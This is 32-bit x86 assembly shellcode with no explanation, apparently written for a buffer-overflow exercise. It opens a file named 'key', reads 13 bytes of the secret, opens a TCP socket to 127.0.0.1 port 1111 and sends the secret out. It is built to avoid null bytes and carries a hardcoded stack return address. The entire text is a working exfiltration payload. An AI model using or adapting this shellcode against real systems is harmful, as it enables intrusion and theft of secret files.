use32

length_key = 13

syscall_open = 5 ;long sys_open(const char __user *filename, int flags, int mode)
syscall_read = 3 ; long sys_read(unsigned int fd, char __user *buf, size_t count)
socket = 1
connect = 3
syscall_socketcall = 102
syscall_send = 9

	mov sp, 401
	; open
	xor eax, eax
	xor ecx, ecx
	push "key "
	mov byte[esp+3], al	
	mov ebx, esp
	mov al, 5
	int 0x80
	
	; read secret
	xor ebx, ebx
	mov bl, al
	mov ecx, esp
	mov dl, length_key
	mov al, syscall_read
	int 0x80
	
	mov esi, esp ; secret
	sub esp, 28
	; init
	mov bl, socket
	cdq
	push edx
	;push IPPROTO_IP
	push 1
	;push SOCK_STREAM
	push 2
	;push AF_INET
	mov ecx, esp
	mov al, syscall_socketcall
	int 0x80
	mov edi, eax
	
	; 0x0100007F
	mov dl, 0x01
	
    shl edx, 24
    mov dl, 0x7f
	push edx
	
	xor ecx, ecx
	mov cx,0x5704 ;1111
    push cx
	inc bl
	push bx
	
	mov ecx, esp
	push 16
	push ecx
	cdq
	push eax
	
	
	
	jmp skip_call
	
	;db 0xff ; :D
	dd 0xbfffedc7
	
skip_call:

	
	mov bl, connect
	mov ecx, esp
	mov al, syscall_socketcall
	int 0x80
	
	mov al, syscall_socketcall
	mov bl, syscall_send
	
	push edx
	push length_key
	push esi
	push edi
	mov ecx, esp
	int 0x80
	
	xor eax,eax
	mov ebx, eax
	mov al,1
	int 0x80